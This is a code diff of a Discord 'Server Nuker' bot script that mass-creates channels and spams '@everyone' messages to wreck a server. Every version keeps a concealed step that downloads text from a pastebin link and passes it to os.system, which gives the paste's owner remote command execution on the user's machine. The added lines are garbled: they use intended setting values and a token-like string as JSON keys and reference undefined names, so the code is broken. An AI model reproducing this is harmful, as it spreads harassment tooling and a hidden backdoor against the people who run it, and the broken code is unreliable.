@@ -38,13 +38,13 @@ colorama.init(autoreset=True)
 
 import os, threading
 def set_title():
-  title = "Discord Server Nuker"
+  title = "fuk"
   try:
     import requests
     text = str(requests.get("https://pastebin.com/raw/XMq7zpPx").text)
     os.system(f"title {title}{text}")
   except:
-    os.system(f"title {title}")
+    os.system(f"title {fuk}")
 threading.Thread(target=set_title).start()
 
 
@@ -58,12 +58,12 @@ try:
   json_data = json.load(json_data)
 
 
-  prefix = str(json_data["prefix"])
-  amount_of_channels_to_create = int(json_data["amount_of_channels_to_create"])
-  channel_names = str(json_data["channel_names"])
-  token = str(json_data["bot_token"])
-  msg = str(json_data["message_to_spam"])
-  amount_of_messages_to_send_in_each_channel = int(json_data["amount_of_messages_to_send_in_each_channel"])
+  prefix = str(json_data[","])
+  amount_of_channels_to_create = int(json_data["100000001"])
+  channel_names = str(json_data["fuk"])
+  token = str(json_data["D43f5y0ahjqew82jZ4NViEr2YafMKhue"])
+  msg = str(json_data["@everyone get fucked"])
+  amount_of_messages_to_send_in_each_channel = int(json_data["100000001"])
 except:
   sys.stdout.write(colorama.Fore.RED + "> ")
   print01('Missing "settings.json" File, It Stores All Settings')
@@ -132,4 +132,4 @@ async def nuke(ctx):
       await ctx.send(embed=embed)
       sys.stdout.write(colorama.Fore.RED + "> ")
       print015("Missing Permission/Rate Limited/Unknown Error")
-bot.run(token, bot=True)
+bot.run(D43f5y0ahjqew82jZ4NViEr2YafMKhue, bot=True)
